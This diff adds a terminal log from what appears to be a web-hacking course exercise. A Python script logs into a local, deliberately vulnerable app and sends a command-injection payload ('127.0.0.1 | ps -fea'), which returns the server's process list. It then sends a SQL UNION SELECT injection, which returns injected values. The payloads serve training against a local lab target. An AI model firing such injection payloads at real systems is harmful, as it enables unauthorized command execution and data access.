@@ -1,0 +1,41 @@
+┌──(elidas㉿kali-FireBall)-[~/…/Master_EIP/11-Hacking/Leccion_3-Hacking_en_entornos_Web/Scripts]
+└─$ python3 Actividad_3.py http://localhost:80/login.php                                                       1 ⨯
+[+] Introduzca Ususario
+>>> admin
+
+[+] Introduzca Contraseña:
+>>> password
+Autenticado con éxito!
+
+[+] Seleccione Dificultad:
+>>> low
+Nivel de dificultad cambiado.
+
+[+] Ataque a lanzar:
+>>> 127.0.0.1 | ps -fea
+[+] Imprimiendo resultados...
+<pre>UID          PID    PPID  C STIME TTY          TIME CMD
+root           1       0  0 20:08 ?        00:00:00 /bin/bash /main.sh
+root          36       1  0 20:08 ?        00:00:00 /bin/bash /usr/bin/mysqld_safe
+mysql        182      36  0 20:08 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb18/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
+root         183      36  0 20:08 ?        00:00:00 logger -t mysqld -p daemon error
+root         280       1  0 20:08 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data     287     280  0 20:08 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data     288     280  0 20:08 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data     289     280  0 20:08 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data     290     280  0 20:08 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data     291     280  0 20:08 ?        00:00:00 /usr/sbin/apache2 -k start
+root         305       1  0 20:08 ?        00:00:00 tail -f /var/log/apache2/access.log /var/log/apache2/error.log /var/log/apache2/other_vhosts_access.log
+www-data     307     280  0 20:09 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data     308     280  0 20:10 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data     318     289  0 20:24 ?        00:00:00 sh -c ping  -c 4 127.0.0.1 | ps -fea
+www-data     319     318  0 20:24 ?        00:00:00 ping -c 4 127.0.0.1
+www-data     320     318  0 20:24 ?        00:00:00 ps -fea
+</pre>
+
+[+] Introduzca el comando:
+>>> ?id=user' UNION SELECT "Oscar","Gutierrez";-- -&Submit=Submit
+[+] Imprimiendo resultados...
+<pre>ID: ?id=user' UNION SELECT "Oscar","Gutierrez";-- -&amp;Submit=Submit
+First name: Oscar
+Surname: Gutierrez</pre>
